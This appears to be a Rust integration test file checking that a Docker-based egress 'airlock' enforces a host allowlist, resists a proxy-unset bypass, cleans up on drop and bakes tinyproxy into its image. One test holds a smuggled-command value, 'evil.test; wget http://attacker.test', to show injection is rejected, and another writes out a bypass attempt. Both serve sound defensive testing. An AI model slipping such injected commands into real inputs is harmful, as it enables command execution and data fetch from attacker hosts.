//! `Airlock` lifecycle against a real Docker daemon (ADR-083).
//!
//! ADR-082 proved the topology by hand; this proves Ferric can stand it up
//! itself. Availability-gated like the rest, and every case carries at least one
//! assertion that cannot pass unless Docker genuinely worked — a silently
//! skipped run must never read as a validated one.

use ferric_research::airlock::Airlock;
use ferric_research::sandbox::{SandboxConfig, check_available, run_in_sandbox};

fn docker_ready(test: &str) -> bool {
    if check_available() {
        return true;
    }
    println!("SKIP {test}: no Docker daemon — airlock NOT validated by this run");
    false
}

/// Start an airlock, treating failure as a **defect rather than a skip**.
///
/// Every caller has already passed `docker_ready`, so by this point Docker is
/// known to work and a failed start is a real one. The tests originally logged
/// `SKIP` here and returned — which meant a genuinely broken airlock reported as
/// a pass. Found by planting a `tinyproxy`-less gateway image: `start` failed,
/// the skip swallowed it, and the suite went green (ADR-087). The availability
/// gate belongs at the top of a test, not around its subject.
fn start_or_fail(allowlist: &[String]) -> Airlock {
    match Airlock::start(allowlist) {
        Ok(lock) => lock,
        Err(e) => panic!("Docker is available, so the airlock must start: {e}"),
    }
}

fn sandboxed(lock: &Airlock, cmd: &[&str]) -> Result<String, String> {
    let config = SandboxConfig {
        network: lock.policy(),
        enforce_runsc: false,
        ..SandboxConfig::default()
    };
    run_in_sandbox(&config, cmd).map_err(|e| e.to_string())
}

/// The whole point, in one test so the (slow) gateway is built once: Ferric
/// creates the networks, runs the gateway, and the result enforces the
/// allowlist against a sandbox that cannot opt out.
#[test]
fn ferric_stands_up_an_enforcing_airlock() {
    if !docker_ready("ferric_stands_up_an_enforcing_airlock") {
        return;
    }

    let lock = start_or_fail(&["example.com".to_string()]);
    assert!(
        lock.proxy_url().starts_with("http://"),
        "the gateway must have an address on the internal network: {}",
        lock.proxy_url()
    );

    // 1. Allowlisted host: reachable through the gateway. This is also the
    //    anti-skip guard — it cannot pass without real egress.
    let allowed = sandboxed(&lock, &["wget", "-qO-", "-T", "15", "http://example.com"]);

    // 2. Not on the allowlist: refused BY the gateway.
    let blocked = sandboxed(&lock, &["wget", "-qO-", "-T", "15", "http://neverssl.com"]);

    // 3. The bypass that defeated the old bridge-based policy.
    let bypass = sandboxed(
        &lock,
        &[
            "sh",
            "-c",
            "unset http_proxy https_proxy; wget -qO- -T 10 http://example.com",
        ],
    );

    assert!(
        allowed
            .as_deref()
            .unwrap_or_default()
            .contains("Example Domain"),
        "an allowlisted host must be reachable: {allowed:?}"
    );
    assert!(
        blocked.is_err(),
        "a blocked host must be refused: {blocked:?}"
    );
    assert!(
        bypass.is_err(),
        "unsetting the proxy env MUST NOT restore egress: {bypass:?}"
    );
}

/// Dropping the `Airlock` must remove the gateway — otherwise a panic mid-run
/// leaks the one container on the machine that has egress.
#[test]
fn dropping_the_airlock_removes_its_resources() {
    if !docker_ready("dropping_the_airlock_removes_its_resources") {
        return;
    }
    let lock = start_or_fail(&["example.com".to_string()]);

    // Assert on THIS airlock's gateway by name, not on the shared prefix:
    // airlocks are deliberately unique per instance, and a concurrently running
    // test has its own gateway. (A prefix match here failed under the default
    // parallel test threads while passing single-threaded — the assertion was
    // wrong, not the teardown.)
    let mine = lock.gateway_name().to_string();
    let exists = |name: &str| -> bool {
        std::process::Command::new("docker")
            .args(["ps", "-a", "--format", "{{.Names}}"])
            .output()
            .map(|o| {
                String::from_utf8_lossy(&o.stdout)
                    .lines()
                    .any(|l| l.trim() == name)
            })
            .unwrap_or(false)
    };

    // Confirm it exists first, so the post-drop assertion means something.
    assert!(exists(&mine), "expected {mine} while the airlock is alive");

    drop(lock);

    assert!(!exists(&mine), "dropping the airlock must remove {mine}");
}

/// An allowlist entry that would be shell-injected is refused before any docker
/// resource is created — a rejected allowlist must not leave debris.
#[test]
fn an_injecting_allowlist_creates_nothing() {
    let before = std::process::Command::new("docker")
        .args(["network", "ls", "--format", "{{.Name}}"])
        .output()
        .map(|o| {
            String::from_utf8_lossy(&o.stdout)
                .matches("ferric-airlock-")
                .count()
        })
        .unwrap_or(0);

    assert!(Airlock::start(&["evil.test; wget http://attacker.test".to_string()]).is_err());

    let after = std::process::Command::new("docker")
        .args(["network", "ls", "--format", "{{.Name}}"])
        .output()
        .map(|o| {
            String::from_utf8_lossy(&o.stdout)
                .matches("ferric-airlock-")
                .count()
        })
        .unwrap_or(0);
    assert_eq!(before, after, "a rejected allowlist must create nothing");
}

/// The property the prebuilt image actually buys (ADR-087).
///
/// Before it, every `Airlock::start` ran `apk add tinyproxy` inside a fresh
/// container — so standing up the airlock depended, at *runtime*, on reaching
/// the Alpine package mirror. The security-critical path had an external
/// availability dependency, and a mirror that was slow or down took the airlock
/// with it. Baking the package in moves that to a one-off build.
///
/// `--network none` is the assertion: the container cannot fetch anything, so
/// this passes only if `tinyproxy` is genuinely present in the image.
#[test]
fn the_gateway_image_needs_no_package_fetch() {
    if !docker_ready("the_gateway_image_needs_no_package_fetch") {
        return;
    }
    // Starting an airlock is what ensures the image exists; drop it immediately.
    drop(start_or_fail(&["example.com".to_string()]));

    let out = std::process::Command::new("docker")
        .args([
            "run",
            "--rm",
            "--network",
            "none",
            "ferric-gateway:1",
            "tinyproxy",
            "-v",
        ])
        .output()
        .expect("docker must be runnable — availability was just checked");

    assert!(
        out.status.success(),
        "tinyproxy must run in the image with no network: {}",
        String::from_utf8_lossy(&out.stderr).trim()
    );
    let banner = format!(
        "{}{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(
        banner.to_lowercase().contains("tinyproxy"),
        "expected a tinyproxy version banner, got: {}",
        banner.trim()
    );
}
